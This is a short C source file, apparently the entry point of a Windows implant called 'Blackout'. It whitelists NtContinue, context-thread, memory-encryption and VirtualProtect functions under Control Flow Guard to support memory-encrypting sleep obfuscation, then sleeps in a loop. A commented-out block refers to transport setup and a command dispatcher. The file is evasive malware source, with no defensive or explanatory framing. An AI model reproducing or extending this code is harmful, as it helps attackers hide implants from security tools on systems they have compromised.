#include <Common.h>
#include <Constexpr.h>

FUNC VOID BlackoutMain(
    _In_ PVOID Param
) {
    BLACKOUT_INSTANCE
        
    BlackoutInit();

    if ( CfgCheckEnabled() ) {
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
    }

    while( 1 ) {
        SleepMain( 5 * 1000 );
    }

    return;
    /*
    do {
        if ( !Instance()->Config.Session.Connected ) {
            if ( TransportInit() )
                CommandDispatcher();
        }
        Sleep( Instance()->Config.Session.SleepTime * 3 );
    } while ( TRUE );
    */
}

